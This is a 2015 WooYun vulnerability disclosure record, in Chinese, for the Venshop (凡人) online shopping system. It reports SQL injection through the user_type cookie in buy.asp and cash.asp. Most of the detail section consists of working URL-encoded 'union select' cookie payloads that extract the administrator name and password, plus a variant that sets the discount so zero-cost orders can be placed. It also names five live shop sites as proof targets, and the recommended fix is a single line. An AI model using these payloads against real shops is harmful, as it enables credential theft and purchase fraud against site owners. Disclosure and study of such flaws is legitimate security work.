{"id": 37007, "wybug_id": "wooyun-2015-0100640", "wybug_title": "凡人网络购物系统多个Cookie Injection，多姿势利用", "wybug_corp": "北京凡人高科技术有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-11 14:39", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 凡人网络购物系统存在多个Cookie Injection，可通过修改Cookie获取管理账号、密码，可以直接提交零元订单。老牌购物系统了，用户量很大，一搜一大堆。老牌购物系统了，用户量很大，一搜一大堆。已测试，该漏洞适用于所有版本（HTML\\ACCESS\\SQL）。 详细说明：  下载地址：http://www.venshop.com/download/Cookie Injection其一：buy.asp页面，可以看到直接读取了Cookie中的user_type参数，没有做任何安全性验证。\n\n注册个帐号，然后登录。设置Cookie，venshop为：\nuser%5Fname=wooyun&user%5Fpass=e10adc3949ba59abbe56e057f20f883e&admin%5Fclass=0&user%5Ftype=1%20union%20select%201,admin_name,3,4%20from%20venshop_admin\n前半部分是系统的验证Cookie（存的账户密码，这个设计。。。），其实要修改的参数只是user_type，下同。\nuser%5Ftype=1%20union%20select%201,admin_name,3,4%20from%20venshop_admin\n\n\n这样可以直接读出管理帐号.\n\n将Cookie，venshop改成：\nuser%5Ftype=1%20union%20select%201,admin_pass,3,4%20from%20venshop_admin\n直接读取密码：\n\nCookie Injection其二：cash.asp页面的Cookie Injection利用也相同：读取账户（设置cookie，venshop中user_type的值）：\nuser%5Ftype=1%20union%20select%201,admin_name,3,4%20from%20venshop_admin\n读取密码：\nuser%5Ftype=1%20union%20select%201,admin_pass,3,4%20from%20venshop_admin\n\n\n\n\n其实从上面不难看出，将付款额度改成了3%，下面改成0%，提交个0元订单。修改Cookie，venshop中user_type的值（admin_name后面跟的就是优惠额度）：\nuser%5Ftype=1%20union%20select%201,admin_name,0,4%20from%20venshop_admin\n\n\n可以提交，提交后付点邮费就行了\n\n   漏洞证明：  为方便测试所有测试账号均注册为：账号：wooyun,密码：123456Cookie,venshop的值：读取账号：\nuser%5Fname=wooyun&user%5Fpass=e10adc3949ba59abbe56e057f20f883e&admin%5Fclass=0&user%5Ftype=1%20union%20select%201,admin_name,0,4%20from%20venshop_admin\n读取密码：\nuser%5Fname=wooyun&user%5Fpass=e10adc3949ba59abbe56e057f20f883e&admin%5Fclass=0&user%5Ftype=1%20union%20select%201,admin_pass,0,4%20from%20venshop_admin\n证明1：http://exey.cn/\n\n\n\n\n\n\n\n证明2：http://www.weiwei518.com/buy.asp\n\n\n\n证明3：http://www.qhlsc88.com/buy.asp\n\n\n\n证明4：http://www.klj0916.com/buy.asp\n\n\n\n证明5：http://ukweihu.com/cash.asp\n\n\n\n   修复方案：  对Cookie参数进行过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}